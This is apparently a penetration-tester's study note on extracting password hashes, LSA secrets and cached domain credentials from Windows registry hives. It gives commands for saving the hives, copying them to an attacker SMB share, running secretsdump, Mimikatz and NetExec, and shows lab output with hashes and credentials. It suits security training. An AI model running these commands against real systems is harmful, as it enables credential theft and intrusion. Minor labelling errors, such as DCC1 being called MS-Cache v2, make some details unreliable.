---
created: 2026-03-06
tags:
  - Windows
  - password_attacks
  - Windows_credential_dumping
---


> **MITRE ATT&CK:** [`T1003.002 — OS Credential Dumping: Security Account Manager`](https://attack.mitre.org/techniques/T1003/001/). 

>**MITRE ATT&CK:** [`T1003.004 — OS Credential Dumping: LSA Secrets`](https://attack.mitre.org/techniques/T1003/004/).

>**MITRE ATT$CK:** [`T1003.005 — OS Credential Dumping: Cached Domain Credentials`](https://attack.mitre.org/techniques/T1003/005/)

### Table of contents

- [[#Windows registry credential stores SAM, SYSTEM, and SECURITY]]
	- [[#SAM Security Account Manager]]
	- [[#SYSTEM Boot configuration and encryption keys]]
	- [[#SECURITY LSA Secrets and cached credentials]]
- [[#Extracting credentials from hive files]]
	- [[#Saving registry hives locally]]
	- [[#Saving registry hives remotely]]
	- [[#Extracting credentials from hive files]]
	- [[#Dumping credentials from a live system]]
	- [[#Automating the process using NetExec]]
- [[#References and further reading]]

## Windows registry credential stores: SAM, SYSTEM, and SECURITY

On Windows, system configuration and authentication material — including NT hashes of user passwords, LSA secrets, and cached domain credentials — is stored in the **[[registry]]**.

The registry is implemented as a set of **hive files** stored on disk under:

```powershell
C:\Windows\System32\config\
```

- These hive files are loaded into memory and accessed via the kernel and user-mode APIs. 
- Each hive is a *structured binary database* (not a plain text file); keys, values, and data are stored in binary structures and accessed through Windows registry APIs.

System hives relevant to credential dumping are:
- **`HKLM\SAM`**
	- Local account names, RIDs, and password hashes.
- **`HKLM\SYSTEM`**
	- System configuration, control sets, and encryption key material (`SYSKEY`) needed to decrypt SAM hashes.
- **`HKLM\SECURITY`**
	- Local Security Authority (LSA) policy data and LSA secrets.

>[!note] To learn more about Windows registry, see [[registry]] and [`Windows Registry — Wikipedia`](https://en.wikipedia.org/wiki/Windows_Registry).
### SAM: Security Account Manager

>**SAM (Security Account Manager)** is a database file that stores information about **local user and group accounts**, including account names, internal identifiers (RIDs), group memberships, and **password hashes** (NT hashes; some older Windows versions could include LM hashes).

- In the registry, the SAM database is mounted as `HKLM\SAM`.
- On disk, the SAM hive file is located at:

```powershell
C:\Windows\System32\config\SAM
```

>[!important] The `HKLM\SAM` hive is not normally readable by non-privileged users. Access is restricted to `SYSTEM` and local administrator accounts.

- With NT hashes of users' accounts, you can perform either a [[Pass-the-Hash]] attack to authenticate directly using the has, or attempt to crack them offline using [[Hashcat]] or [[JohnTheRipper]] to obtain plaintext passwords.
- However, even if you copy the SAM database to your machine, you won't be able to retrieve password hashes right away.
- Passwords in SAM are not just hashed but also **encrypted** with the **machine key**, also known as `SYSKEY`. This key is stored in the **`SYSTEM` hive**.

>[!important] To retrieve users' password hashes, you need both the `SAM` and `SYSTEM` hives.

### SYSTEM: Boot configuration and encryption keys

>The **`SYSTEM` hive** stores general system configuration and state data, including control sets, driver devices, hardware profiles, service configuration, RNG seed, and other platform state, as well as critical security subsystem configuration data and **cryptographic key material used by Windows security subsystem**.

- In the registry, the `SYSTEM` hive is mounted at `HKLM\SYSTEM`.
- On disk, the `SYSTEM` hive is stored at:

```powershell
C:\Windows\System32\config\SYSTEM
```

>[!important] The SAM encryption key, also called the boot key or `SYSKEY`, is derived from values stored in the `SYSTEM` hive.

- The boot key is constructed from several registry values (specifically, `JD`, `Skew1`, `GBG`, and `Data`) stored in the `SYSTEM` hive:

```powershell
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

- So, to extract password hashes from the SAM database, you would:
	1. Extract key material from the `SYSTEM` hive.
	2. Assemble the `SYSKEY` from the registry values.
	3. Use the `SYSKEY` to decrypt the SAM password hashes.

### SECURITY: LSA Secrets and Domain Cached Credentials

>The **`SECURITY` hive** stores Windows **Local Security Authority (LSA) data**.

- In the registry, the `SECURITY` hive is mounted at `HKLM\SECURITY`.
- On disk, it's stored at:

```powershell
C:\Windows\System32\config\SECURITY
```

>[!important] Because it contains sensitive data, the `HKLM\SECURITY` hive is not accessible to regular users or even administrators by default. Access is restricted to the `SYSTEM` account.

The **Local Security Authority (LSA)** is a protected Windows subsystem that manages local security policies, processes authentication requests, and generates audit logs. The sensitive data handled by LSA is referred to as **LSA secrets**.

>[!note] To learn more about the LSA and LSASS, see [[LSASS memory#Understanding LSA and LSASS]].
#### LSA secrets

- **LSA secrets** are stored in the registry under:

```
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

These include, but are not limited to:
- **Service account credentials** (passwords for services configured to run under specific user accounts).
- **Machine account password** (the password for the computer's account within an AD domain).
- Application data, such as passwords for **[RAS (Remote Access Service)](https://learn.microsoft.com/en-us/windows/win32/rras/ras-connection-operations)**, **SQL Server connections**, and older versions of Internet Explorer.
- **[EFS (Encrypting File System)](https://en.wikipedia.org/wiki/Encrypting_File_System) encryption keys**.
- **Domain Cached Credentials** (DCC1 and DCC2 hashes).
- And more.

>[!important] LSA secrets are encrypted using `SYSKEY` stored in the `SYSTEM` hive.
#### Domain Cached Credentials (DCC)

In Active Directory environments, users normally authenticate against a **Domain Controller (DC)**.

However, if the DC is unreachable (such as when a laptop is used outside the corporate network), domain-joined machines must still allow users to log.
To support this scenario, Windows stores **Domain Cached Credentials (DCC)** locally.

>**Domain Cached Credentials (DCC)**, also known as **MS-Cache**, are locally stored hashes of domain user credentials that allow previously authenticated users to log in even when a domain controller is unreachable.

- So, when a user successfully authenticates to a domain while the DC is reachable, Windows stores a derived credential hash locally. 
- During subsequent logons, if Windows sees it can't contact the DC, it retrieves the cached credential entry form `HKLM\SECURITY\Cache`, applies the **same hashing algorithm** as the one used to create the DCC to the password the user entered, and compares the values. If they match, the user is let in.

>[!important] Domain Cached Credentials are stored in the Windows registry under the **`HKEY_LOCAL_MACHINE\SECURITY\Cache`** key within the `SECURITY` hive.
>```
>HKEY_LOCAL_MACHINE\SECURITY\Cache
>```
>Entries appear as values named:
> 
> ```
> NL$1
> NL$2
> ...
> NL$10
> ```

>[!important] Each cached credential (`NL$1`, `NL$2`, etc.) is encrypted using a **machine-specific master key called `NL$KM`**, which is stored as an **LSA secret**.
>- `NL$KM` contains a **64-byte master key** bound to the local machine.
>- The key itself is **encrypted using `SYSKEY`**.
> ```mermaid
> flowchart
> n2["**SYSKEY**"]
> n1@{ label: "Rectangle" }
> n2 --- n1["**LSA secret encryption**"]
> n3@{ label: "Rectangle" }
> n1 --- n3["**NL$KM**"]
> n3 --- n4["**Decrypt NL$1 / NL$2 / ... entries**"]
> ```

There are two versions of DCC: **DCC1** and **DCC2**:

- **DCC1 (MS-Cache v2)**
	- Uses a simple MD4-based algorithm.
	- Used in Windows XP and Windows Server 2003.

```
DCC1 = MD4( NT_hash + username )
```

- **DCC2 (MS-Cache v2)**
	- Uses salted **PBKDF2-HMAC-SHA1**, which is significantly more resistant to brute-forcing.
	- Used in all modern versions (Vista, 7, 8, 10, 11 and Windows Server 2008+).

```
DCC2 = PBKDF2(  
HMAC-SHA1,  
password = DCC1,  
salt = username,  
iterations = 10240  
)
```

>[!note] By default, Windows caches the last **`10`** successful domain logons. This can be modified via Group Policy or the registry key `CachedLogonsCount` (from `0` to `50`).

>[!important] DCC hashes can not be used in [[Pass-the-Hash]] attacks. To recover usable credentials, you need to crack the hash offline.

>[!note] To learn about DCC hash format and how to the hashes using [[Hashcat]], see [[cracking Windows hashes_#DCC1 and DCC2]].
## Extracting credentials from registry hives

To extract credentials from the registry, you need either a shell with `SYSTEM` privileges or local Administrator access with `SeBackupPrivilege` (typically held by members of the `Administrators` and `Backup Operators` groups).

Once you have the necessary privileges, you can take either of the following approaches:
- Copy registry hive data from the running system into files using the [`reg`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) or [`vssadmin`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) Windows commands, then transfer the files to your local machine and parse them offline using [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
- Copy registry hive data remotely using [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`reg.py`](https://github.com/fortra/impacket/blob/master/examples/reg.py), and extract credentials using [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
- Extract credentials directly from the live registry using [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `lsadump::sam` and `lsadump::secrets` modules (these parse the running registry in-memory).
- Use [`NetExec`](https://github.com/Pennyw0rth/NetExec) to automate the entire process remotely.

>[!note] The techniques discussed in this article aim to retrieve users' **password hashes**, not plaintext passwords. To learn how to crack those using [[Hashcat]], see [[cracking Windows hashes_]].
### Saving registry hives locally

- On a running Windows system, you can use the Windows [`reg`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg) command to save registry data to files:

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.hive
```

```powershell
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```

```powershell
reg save HKLM\SECURITY C:\Windows\Temp\security.hive
```

>[!note] `reg save` bypasses ACL restrictions because it uses `SeBackupPrivilege`.

- Alternatively, such as when `reg save` is blocked by policies or an EDR, you can use  [`vssadmin`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) to create a **Volume Shadow Copy** — a point-in-time snapshot of the filesystem, including the registry — that you can then read safely:

```powershell
vssadmin create shadow /for=c:
```

>[!warning] The `vssadmin create` command is **not available on Windows 10 and Windows 11** (client editions). This command is only present in **Windows Server** operating systems.

- List existing volume shadows:

```powershell
vssadmin list shadows
```

- Then copy the registry hives from the shadow copy:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SAM C:\Windows\Temp\sam.hive
```

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SYSTEM C:\Windows\Temp\system.hive
```

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\Config\SECURITY C:\Windows\Temp\security.hive
```

>[!example]+
>![[vssadmin_registry.png]]

- Once your're done, remove the shadow copy:

```powershell
vssadmin delete shadows /for=c: /all
```

>[!tip]+
> **Transferring hive files to your attacker machine:**
> 
> - Set up an SMB server on your machine (using oldie-but-goodie [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`smbserver.py`](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)):
> 
> ```bash
> smbserver.py -smb2support "share" "./"
> ```
> 
> - Then copy the hive files to the share:
> 
> ```powershell 
> copy C:\Windows\Temp\sam.hive \\<attacker_ip_address>\share\sam.hive
> ```
> 
> ```powershell
> copy C:\Windows\Temp\system.hive \\<attacker_ip_address>\share\system.hive
> ```
> 
> ```powershell
> copy C:\Windows\Temp\security.hive \\
> <attacker_ip_address>\share\security.hive
> ```
> 
>>[!note] See [[Linux_file_transfers]] and [[Windows_file_transfers]] for more file transfer methods.

>[!example]+
>![[save_registry_hives.png]]
### Saving registry hives remotely

To copy registry hive data remotely, you can use [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`reg.py`](https://github.com/fortra/impacket/blob/master/examples/reg.py) (you still need valid credentials for the remote system).

- Create an SMB share on your attacker machine:

```bash
smbserver.py -smb2support "share" "./"
```

- Copy the registry hive data using [`reg.py`](https://github.com/fortra/impacket/blob/master/examples/reg.py):

```bash
reg.py domain/user:password@target save -keyName HKLM\\SAM -o \\<attacker_ip_address>\share
```

```bash
reg.py domain/user:password@target save -keyName HKLM\\SYSTEM -o \\<attacker_ip_address>\share
```

```
reg.py domain/user:password@target save -keyName HKLM\\SECURITY -o \\<attacker_ip_address>\share
```

- Or backup up all three hives in a single command:

```bash
reg.py domain/user:password@target backup -o \\<attacker_ip_address>\share
```
### Extracting credentials from hive files

Once you have the registry hive files, you can decrypt and parse them using [`Impacket`](https://github.com/SecureAuthCorp/impacket)'s [`secretsdump.py`](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py):

```bash
secretsdump.py \
  -sam sam.hive \
  -system system.hive \
  -security security.hive \
  LOCAL
```

- `-sam`: local SAM database (local accounts & hashes).
- `-system`: system hive (decryption key material for SAM).
- `-security` (optional): LSA secrets.
- `LOCAL`: tells `secretsdump` that you’re extracting credentials stored on the local host and not connecting over the network.

>[!example]+
>![[secretsdump.py_registry.png]]
> 
> ```powershell
> secretsdump.py \
>   -sam sam.hive \
>   -system system.hive \
>   -security security.hive \
>   LOCAL
> ```
> 
> ```powershell
> Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
> 
> [*] Target system bootKey: 0xd33955748b2d17d7b09c9cb2653dd0e8
> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
> Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
> bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
> jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
> ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
> frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
> [*] Dumping cached domain logon information (domain/username:hash)
> [*] Dumping LSA Secrets
> [*] DPAPI_SYSTEM 
> dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
> dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
> [*] NL$KM 
>  0000   E4 FE 18 4B 25 46 81 18  BF 23 F5 A3 2A E8 36 97   ...K%F...#..*.6.
>  0010   6B A4 92 B3 A4 32 DE B3  91 17 46 B8 EC 63 C4 51   k....2....F..c.Q
>  0020   A7 0C 18 26 E9 14 5A A2  F3 42 1B 98 ED 0C BD 9A   ...&..Z..B......
>  0030   0C 1A 1B EF AC B3 76 C5  90 FA 7B 56 CA 1B 48 8B   ......v...{V..H.
> NL$KM:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
> [*] _SC_gupdate 
> (Unknown User):Password123
> [*] Cleaning up... 
> ```
> - In the output, you see two hashes for each user: the first one is **LM hash**, and the second is **NT hash**. The format is as follows:
> ```bash
> username : RID : LM_hash : NT_hash ::: 
> ```

### Dumping credentials from a live system

On a running system, with sufficient privileges, you can extract local user password hashes and LSA secrets using [Mimikatz](https://github.com/gentilkiwi/mimikatz)'s `lsadump::sam` and `lsadump::secrets` modules. These read from the live registry in-memory rather than from disk hive files.

1. Request `SeDebugPrivilege` using `privilege::debug`:

```powershell
privilege::debug
```

2. Use `lsadump::sam` to extract credentials from the SAM database:

```powershell
lsadump::sam
```

3. And `lsadump::secrets` to get LSA secrets:

```powershell
lsadump::secrets
```

>[!tip]+
>To save the data for offline analysis, run:
>```powershell
>lsadump::sam /sam:SAM.hive /system:SYSTEM.hive
>```

### Automating the process using NetExec

[`NetExec`](https://github.com/Pennyw0rth/NetExec) (see [[NetExec]]) can connect to the target system, save the hives, and extract credentials in a single command.

- Dump SAM/LSA secrets remotely using username and password to authenticate:

```bash
netexec smb <target> -d <domain> -u <username> -p <password> --sam/--lsa
```

- `-d`, `--domain`: Domain to authenticate to.
- `-u`, `--username`: Target username. 
- `-p`, `--password`: Password for the target username.
- `--sam`: Dump SAM hashes from the target system. 
- `--lsa`: Dump LSA secrets from the target system.

>[!example]+
> ![[netexec_credential_dump.png]]
> 
> ```bash
> netexec smb 10.129.2.118 -d ACADEMY-PWATTACKS-WIN10SAM -u Bob -p HTB_@cademy_stdnt! --sam
> ```
> 
> ```bash
> SMB         10.129.2.118    445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FrontDesk01) (signing:False) (SMBv1:False)
> SMB         10.129.2.118    445    FRONTDESK01      [+] ACADEMY-PWATTACKS-WIN10SAM\Bob:HTB_@cademy_stdnt! (Pwn3d!)
> SMB         10.129.2.118    445    FRONTDESK01      [*] Dumping SAM hashes
> SMB         10.129.2.118    445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> SMB         10.129.2.118    445    FRONTDESK01      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> SMB         10.129.2.118    445    FRONTDESK01      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
> SMB         10.129.2.118    445    FRONTDESK01      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
> SMB         10.129.2.118    445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
> SMB         10.129.2.118    445    FRONTDESK01      jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
> SMB         10.129.2.118    445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
> SMB         10.129.2.118    445    FRONTDESK01      frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
> ```

- Authenticate using local user authentication:

```bash
netexec smb <target> --local-auth -u <username> -p <password> --sam/--lsa
```

- Using [[Pass-the-Hash]] (NTLM):

```bash
netexec smb <target> -d <domain> -u <username> -H <password> --sam/--lsa
```

- Using [[Pass-the-Ticket]] (Kerberos):

```bash
netexec smb <target> --kerberos --sam/--lsa
```

> [!note] Both `secretsdump.py` and `NetExec` extract security questions from the LSA if they exist. They're JSON-'formatted, UTF-16-LE encoded, and hex encoded on top of that (though it doesn't protect them at all).

## References and further reading

- [`OS Credential Dumping: Security Account Manager — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/001/)
- [`OS Credential Dumping: LSA Secrets — MITRE ATT&CK`](https://attack.mitre.org/techniques/T1003/004/)
- [`SAM & LSA secrets — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)
- [`Security Account Manager — Wikipedia`](https://en.wikipedia.org/wiki/Security_Account_Manager)
- [`SecretsDump Demystified — Mike Benich, Medium`](https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b)
- [`Credential Dumping: SAM — Hacking Articles`](https://www.hackingarticles.in/credential-dumping-sam/)

